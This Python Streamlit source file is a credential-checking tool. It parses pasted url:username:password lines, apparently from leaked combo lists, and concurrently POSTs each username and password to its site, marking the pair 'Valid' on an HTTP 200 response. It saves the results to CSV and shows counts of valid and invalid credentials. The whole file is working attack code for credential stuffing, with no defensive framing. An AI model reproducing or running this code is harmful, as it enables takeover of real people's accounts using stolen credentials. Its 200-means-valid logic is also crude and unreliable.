import streamlit as st
import requests
import concurrent.futures
import pandas as pd
import os
import time
import asyncio
import aiohttp
from urllib.parse import urlparse, urlunparse
from bs4 import BeautifulSoup

def info_display_box(label, value, info):
    st.metric(label=f"{label}", value=f"{value}", label_visibility="hidden")
    st.info(f'{info}', icon="📌")


def top_information(total_urls, total_filter_records, total_apply_filter):
        col1, col2, col3 = st.columns(3)
        with col1:
            try:
                label = ""
                value = total_urls
                info  = "Records"
                info_display_box(label, value, info)
            except:
                pass
        with col2:
            try:
                label = ""
                value = total_filter_records
                info  = "Filter Records"
                info_display_box(label, value, info)
            except:
                pass
        with col3:
            try:
                label = ""
                value = total_apply_filter
                info  = "Apply Filters"
                info_display_box(label, value, info)
            except:
                pass

        st.divider()




def top_information_for_status(total_filter_records, total_valid_credentials, total_invalid_credentials):
    col1, col2, col3 = st.columns(3)
    with col1:
        try:
            label = ""
            value = total_filter_records
            info  = "Filter Records"
            info_display_box(label, value, info)
        except:
            pass
    with col2:
        try:
            label = ""
            value = total_valid_credentials
            info  = "Valid"
            info_display_box(label, value, info)
        except:
            pass
    with col3:
        try:
            label = ""
            value = total_invalid_credentials
            info  = "Invalid"
            info_display_box(label, value, info)
        except:
            pass

    st.divider()




def load_filter_keywords():
    csv_file = 'filter_keywords.csv'
    if os.path.exists(csv_file):
        df = pd.read_csv(csv_file)
        return df
    return None

from aiohttp import ClientTimeout
from urllib.parse import urlparse
# Define a timeout for each request
REQUEST_TIMEOUT = 120  # seconds
MAX_CONCURRENT_TASKS = 50  # Limit number of concurrent tasks to avoid overwhelming the system


async def check_url_credentials_async(session, row, index):
    url      = row['url']
    email    = row['email']
    username = row['username']
    password = row['password']
    
    parsed_url = urlparse(url)

    # Ensure the scheme is 'https' and check the netloc part for any leading slashes
    if parsed_url.scheme not in ['http', 'https']:
        # If netloc is empty, the domain might have been parsed into the path
        if not parsed_url.netloc:
            netloc = parsed_url.path  # treat the path as netloc (domain)
            path = ''
        else:
            netloc = parsed_url.netloc
            path = parsed_url.path

        # Construct the new URL with 'https'
        url = urlunparse(('https', netloc.lstrip('/'), path, parsed_url.params, parsed_url.query, parsed_url.fragment))
        parsed_url = urlparse(url)


    if parsed_url.scheme not in ['http', 'https']:
        return f"Skipped (Unsupported scheme: {parsed_url.scheme})"
    
    data = {
        'username': username if username != 'none' else email,
        'password': password
    }
    try:
        async with session.post(url, data=data, timeout=ClientTimeout(total=REQUEST_TIMEOUT)) as response:
            if response.status == 200:
                return "Valid"
            else:
                return "Invalid"
    except asyncio.TimeoutError:
        return "Timeout"
    except aiohttp.ClientError as e:
        return f"Error: {e}"


async def check_credentials_async(df, credentials_status_file):
    total_rows = len(df)
    status_list = []

    # Create Streamlit progress bar and percentage display
    progress_bar = st.sidebar.progress(0)
    percentage_display = st.sidebar.empty()

    # Semaphore to limit the number of concurrent tasks
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

    # Create an async session to use for all requests
    async with aiohttp.ClientSession() as session:
        tasks = []

        # Wrap the credential check in a semaphore to limit concurrency
        async def limited_check(row, index):
            async with semaphore:
                return await check_url_credentials_async(session, row, index)

        # Create tasks for all rows in the DataFrame
        for index, row in df.iterrows():
            tasks.append(limited_check(row, index))

        # Execute tasks asynchronously
        for index, task in enumerate(asyncio.as_completed(tasks)):
            status = await task
            status_list.append(status)

            # Calculate and update progress
            current_progress = (index + 1) / total_rows
            progress_percentage = int(current_progress * 100)
            progress_bar.progress(current_progress)
            percentage_display.write(f"Progress: {progress_percentage}% Done")

    # Add the status to the DataFrame
    df['status'] = status_list

    try:
        # Save the DataFrame to the CSV file
        if os.path.exists(credentials_status_file):
            df.to_csv(credentials_status_file, index=False)
            col1, col2 = st.columns(2)
            with col1:
                st.success(f"Status Record Updated and Saved.")
            with col2:
                st.info("""Now turn OFF the current toggle and 
                    turn ON Analysis Credentials toggle if 
                    you want to check status of all 
                    credentials""")
        else:
            df.to_csv(credentials_status_file, index=False)
            col1, col2 = st.columns(2)
            with col1:
                st.success(f"File Created and Record Saved.")
            with col2:
                st.info("""Now turn OFF the current toggle and 
                    turn ON Analysis Credentials toggle if 
                    you want to check status of all 
                    credentials""")
    except:
        pass
    
    return df





def actual_data(input_data):
    url_list = input_data.splitlines()
    df = pd.DataFrame(url_list, columns=["URLs"])
    st.write("Actual Data:")
    st.dataframe(df)



def process_data(input_data):
    data = []
    for line in input_data.splitlines():
        try:
            url, username, password = line.rsplit(":", 2)
            
            if '@' in username:
                email = username
                username = 'none'
            else:
                email = 'none'
            
            data.append([url, email, username, password])
        except:
            pass
    df = pd.DataFrame(data, columns=["url", "email", "username", "password"])
    return df


